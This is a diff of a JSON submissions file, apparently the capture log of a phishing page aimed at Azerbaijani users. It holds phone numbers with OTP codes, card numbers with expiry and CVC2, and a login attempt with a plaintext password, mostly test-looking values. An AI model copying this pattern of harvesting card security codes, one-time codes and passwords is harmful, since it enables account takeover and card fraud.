@@ -1,89 +1,17 @@
 {
   "submissions": [
     {
-      "id": "2jOo5jBn",
-      "phoneNumber": "+994436365334",
-      "status": "verified",
-      "createdAt": "2025-06-23T21:18:50.026Z",
-      "otpCode": "332554",
-      "verifiedAt": "2025-06-23T21:19:12.108Z"
-    },
-    {
-      "id": "vr93ckjP",
-      "phoneNumber": "+994222222222",
-      "status": "verified",
-      "createdAt": "2025-06-23T20:49:36.052Z",
-      "otpCode": "512344",
-      "verifiedAt": "2025-06-23T20:49:43.092Z"
-    },
-    {
-      "id": "pfr6sBZv",
-      "phoneNumber": "+994242314122",
-      "status": "verified",
-      "createdAt": "2025-06-23T16:47:40.148Z",
-      "otpCode": "142345",
-      "verifiedAt": "2025-06-23T16:47:49.583Z"
-    },
-    {
-      "id": "s4HSPuWX",
-      "phoneNumber": "+994321411111",
-      "status": "verified",
-      "createdAt": "2025-06-23T16:29:04.790Z",
-      "otpCode": "122242",
-      "verifiedAt": "2025-06-23T16:29:15.572Z"
-    },
-    {
-      "id": "aAE8eGAe",
-      "phoneNumber": "+994354353535",
+      "id": "aVOoJGvF",
+      "phoneNumber": "+994232424242",
       "status": "pending_otp",
-      "createdAt": "2025-06-23T16:28:55.073Z"
+      "createdAt": "2025-06-24T12:29:02.073Z"
     },
     {
-      "id": "yBZ3vGGO",
-      "phoneNumber": "+994224242424",
-      "status": "pending_otp",
-      "createdAt": "2025-06-23T15:50:05.926Z"
-    },
-    {
-      "id": "8FPOogKh",
-      "phoneNumber": "+994234341242",
-      "status": "pending_otp",
-      "createdAt": "2025-06-23T15:34:41.787Z"
-    },
-    {
-      "id": "5v5EGftG",
-      "phoneNumber": "+994141412312",
-      "status": "verified",
-      "createdAt": "2025-06-23T14:57:35.185Z",
-      "otpCode": "111114",
-      "verifiedAt": "2025-06-23T14:57:47.776Z"
-    },
-    {
-      "id": "e5Lcti9w",
-      "cardname": "asdas",
-      "cardnr": "1231245123123113",
-      "validMONTH": "11",
-      "validYEAR": "44",
-      "cvc2": "232",
-      "createdAt": "2025-05-01T04:22:12.454Z"
-    },
-    {
-      "id": "VTcsQEZj",
-      "cardname": "denemevf",
-      "cardnr": "3243141231231231",
-      "validMONTH": "11",
-      "validYEAR": "44",
-      "cvc2": "123",
-      "createdAt": "2025-05-01T04:14:34.860Z"
-    },
-    {
-      "id": "dcVGBJiC",
-      "cardname": "denemevf",
-      "cardnr": "3243141231231231",
-      "validMONTH": "11",
-      "validYEAR": "44",
-      "cvc2": "123",
-      "createdAt": "2025-05-01T04:14:09.040Z"
+      "id": "VUbTuUkv",
+      "type": "Giriş Cəhdi",
+      "phoneNumber": "+994343242234",
+      "password": "34324523423",
+      "createdAt": "2025-06-24T12:19:10.507Z"
     }
   ],
   "visits": 1
